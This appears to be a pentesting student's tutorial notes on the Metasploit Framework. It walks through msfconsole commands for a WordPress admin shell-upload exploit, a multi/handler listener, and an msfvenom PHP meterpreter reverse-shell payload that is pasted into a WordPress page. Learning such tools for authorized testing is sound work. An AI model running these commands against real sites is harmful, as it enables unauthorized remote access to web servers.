# Metasploit Framework Explained

Metasploit is a very famous tool to use exploits.

## Some explanation of the modules

In professional pentesting we won't be creating our own exploits. That is very rare.
The industry uses that framework because each exploit available has been tested and known to be sure.
It could be risky to use any public code.

To access the modules we go to this path in kali

```bash
cd /usr/share/metasploit-framework/modules
```

`auxiliary encoders evasion exploits nops payloads post`

What we take advantage of, the breach, is called an exploit.
We use an `exploit` to run a `payload`.

Auxiliaries are the most important part after the `payload`.
The `auxiliary` will be triggered once we are inside the server.

`Post` are tools that we use after the `payload`, like a keylogger.
`Encoders` help to hide your malicious code.

The `payloads` come in two versions: `singles` and `stagers`.
When sending your `payload`, will you send it in one or multiple shots ?

Sometimes `stagers` won't work, the access could die within a second.
This means that you have to send it in one shot (`singles` )

## Using metasploit

To start metasploit, we have to write this keyword.

```bash
msfconsole
```

This launches the metasploit console.
There are authenticated and non-authenticated exploits.

## Wordpress exploits

```bash
search type:exploit wordpress
```

That gives us a list of wordpress exploits.
Each on got an id number, a name, a disclosure date, a rank and a description.
If the check column has a Yes, it means that you can check if the website is vulnerable to this exploit.

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

By writing `info` that gives you more information.
That says that there are a few information that are required, such as the username, password and host.

```bash
SET USERNAME username
SET PASSWORD password
SET RHOSTS url
```

Once it is set with the info, we run it.

```bash
exploit
```

That sends it to the stages and the meterpreter opens itself. This is the type of payload.
Meterpreter is a very powerful tool.

```bash
help
```

This is a wordpress website running on php. Php meterpreter is the weakest.

## Multi handler

```bash
use multi/handler
```

This is the part of the framework that listens to a connexion.

```bash
set payload php/meterpreter/reverse_tcp
show options
```

In this payload there are two options.
LHOST and LPORT.

```bash
set LPORT 123
set LHOST 0.0.0.0
run
```

We are now listening on port 123.
The 123 port is the one we use to get publicly available time servers. It usually stays opened.
We always set LHOST to be 0.0.0.0, this is a wildcard. Everything will get accepted.

Now let's create a payload with msfvenom.
On another terminal tab:

```bash
msfvenom -p php/meterpreter/reverse_tcp LPORT=123 LHOST=10.0.100.9 -f raw
```

To launch the code we get from this command line, we'll paste it into a wordpress page and visit it.